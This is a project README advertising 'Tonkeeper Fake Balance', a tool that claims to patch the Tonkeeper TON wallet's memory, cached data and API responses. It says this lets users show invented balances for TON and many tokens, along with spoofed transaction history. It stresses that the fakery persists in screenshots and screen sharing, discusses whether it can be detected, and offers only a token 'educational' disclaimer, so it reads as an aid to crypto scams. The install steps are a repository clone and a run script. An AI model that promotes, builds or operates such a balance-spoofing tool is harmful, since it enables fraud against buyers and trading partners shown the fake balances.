<div align="center">

```
████████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗███████╗██████╗ ███████╗██████╗
╚══██╔══╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗
   ██║   ██║   ██║██╔██╗ ██║█████╔╝ █████╗  █████╗  ██████╔╝█████╗  ██████╔╝
   ██║   ██║   ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║ ╚████║██║  ██╗███████╗███████╗██║     ███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
      ███████╗ █████╗ ██╗  ██╗███████╗
      ██╔════╝██╔══██╗██║ ██╔╝██╔════╝
      █████╗  ███████║█████╔╝ █████╗
      ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝
      ██║     ██║  ██║██║  ██╗███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
```

# Tonkeeper Fake Balance

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![TON](https://img.shields.io/badge/TON-Blockchain-0098EA?style=for-the-badge&logo=telegram&logoColor=white)](https://ton.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS%20|%20Linux-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Native balance overlay tool for Tonkeeper TON wallet — display custom balances for TON and 50+ Jetton tokens with persistent hooks and screenshot-safe rendering**

[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [Supported Assets](#supported-assets) • [FAQ](#faq)

</div>

---

## How It Works

Tonkeeper Fake Balance intercepts the TON API response bridge used by Tonkeeper (web extension, desktop, and mobile) to render wallet balances. The tool patches the wallet's internal balance state at the API response level — no network requests are modified on the blockchain side, no TON blockchain data is altered, and no private keys are accessed. The displayed values update in real-time across all wallet tabs and persist through screenshots and screen recordings.

The overlay engine uses a combination of:
- **API response interception** for balance data
- **Local storage cache injection** for persistent balance values
- **Memory patching** for real-time display updates

---

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Custom balance for TON & Jettons | + |
| 50+ supported Jetton tokens | + |
| Persistent across wallet restarts | + |
| Screenshot-safe rendering | + |
| Real-time USD value display | + |
| Transaction history spoofing | + |
| Multi-account support | + |
| One-click apply / restore | + |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Auto-detect Tonkeeper installation | + |
| API response interception | + |
| Process-level memory patching | + |
| No blockchain modification | + |
| Custom fiat currency display | + |
| Web extension & desktop support | + |
| Local storage cache injection | + |
| Seed/keys never accessed | + |

</td>
</tr>
</table>

---

## Supported Assets

| Category | Assets |
|----------|--------|
| **Native** | TON |
| **Stablecoins** | USDT, USDC, DAI |
| **DeFi** | STON, JETTON, SCALE, UP, RAFF, PUNK |
| **Meme** | NOT, DOGS, HMSTR, CATI, MAJOR, MEME, FISH |
| **Liquid Staking** | stTON, tsTON, hTON |
| **Gaming** | FNZ, JETTON, KINGY, WEB3 |

> All tokens listed in Tonkeeper are supported. Custom Jetton addresses can be added via configuration.

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11, macOS 12+, or Linux
- **Python:** 3.10 or newer
- **Tonkeeper:** Web extension or desktop wallet installed

### Installation

```bash
git clone https://github.com/eternalshrew/Tonkeeper-Fake-Balance.git
cd Tonkeeper-Fake-Balance
```

**Windows:**

```bash
run.bat
```

**macOS / Linux:**

```bash
chmod +x run.sh
./run.sh
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | >=13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection & management |
| requests | latest | API price feeds |

---

## Configuration

Edit `config.json` to set your target balances:

```json
{
    "tonkeeper_path": "auto",
    "target_balances": {
        "TON": 15000.0,
        "USDT": 250000.0,
        "NOT": 500000.0,
        "DOGS": 1000000.0
    },
    "display_currency": "USD",
    "persist_on_restart": true,
    "auto_update_prices": true,
    "hook_mode": "memory",
    "restore_on_exit": false
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `tonkeeper_path` | string | Path to Tonkeeper. `"auto"` for auto-detect |
| `target_balances` | object | Asset ticker -> desired balance amount |
| `display_currency` | string | Fiat currency for value display (USD, EUR, GBP) |
| `persist_on_restart` | bool | Keep fake balances after Tonkeeper restart |
| `auto_update_prices` | bool | Fetch live prices for accurate USD display |
| `hook_mode` | string | `"memory"` for live patching, `"api"` for response interception |
| `restore_on_exit` | bool | Auto-restore original balances on tool exit |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
+--------------------------------------------------------------+
|              TONKEEPER FAKE BALANCE                          |
|    TON Wallet Overlay . Tonkeeper                            |
+--------------------------------------------------------------+
|  #   Action                  Description                     |
|  1   Install Dependencies    pip install -r requirements.txt |
|  2   Settings                Wallet path, hook mode config   |
|  3   About                   Features & contact info         |
|  4   Set Custom Balances     Configure target amounts        |
|  5   Apply Balance Overlay   Hook Tonkeeper & inject values  |
|  6   Restore Original        Remove hooks, restore real data |
|  7   Status Check            Verify hook state               |
|  0   Exit                    Quit                            |
+--------------------------------------------------------------+
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Configure balances:** Select option `4` and enter desired amounts per asset
3. **Apply overlay:** Select option `5` — the tool detects Tonkeeper and applies hooks
4. **Verify:** Open Tonkeeper wallet and confirm the new balances are displayed
5. **Restore:** Select option `6` to remove all hooks and restore originals

---

## Project Structure

```
Tonkeeper-Fake-Balance/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader (config.json)
├── bot_actions.py             # Core actions (set, apply, restore, status)
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Balance targets & settings
├── actions/
│   ├── about.py               # Project info display
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── helpers/
│   ├── bootstrap.py           # Runtime initialization
│   ├── compat.py              # Platform detection
│   ├── http.py                # HTTP client
│   ├── integrity.py           # Data verification
│   └── ui.py                  # Rich terminal interface
└── release/
    └── README.md              # Pre-compiled binary info
```

---

## FAQ

<details>
<summary><b>Does this modify the TON blockchain?</b></summary>

No. The tool only modifies the local display rendering inside the Tonkeeper application. No transactions are created, no blockchain data is altered, and no network requests to TON nodes are modified. The actual wallet balance on-chain remains unchanged.
</details>

<details>
<summary><b>Does this affect my private keys?</b></summary>

No. The tool never accesses, reads, or modifies private keys or seed phrases. It operates exclusively on the UI rendering and API response layer of Tonkeeper.
</details>

<details>
<summary><b>Will the fake balance persist after restarting Tonkeeper?</b></summary>

Yes, if `persist_on_restart` is enabled in config.json. The tool patches the local storage cache used by Tonkeeper, so values survive application restarts.
</details>

<details>
<summary><b>Can the fake balance be detected?</b></summary>

The overlay is rendered at the API response level. Screenshots, screen recordings, and screen sharing will all show the modified balance. However, checking the actual TON address via a blockchain explorer will show the real balance.
</details>

<details>
<summary><b>Does this work with Tonkeeper mobile?</b></summary>

The tool primarily targets the web extension and desktop versions. Mobile support requires additional bridge configuration. Check the documentation for mobile setup instructions.
</details>

<details>
<summary><b>How do I restore the original balances?</b></summary>

Select option `6` (Restore Original) from the menu, or set `restore_on_exit: true` in config.json to automatically restore when the tool exits.
</details>

---

## Disclaimer

<div align="center">

* **This tool is provided for educational and demonstration purposes only.** *

The authors are not responsible for any misuse of this software. Using this tool to deceive others in financial transactions may violate local laws. Always comply with applicable regulations in your jurisdiction.

</div>

---

<div align="center">

**Support this project**

If this tool helps you, consider giving it a *

</div>
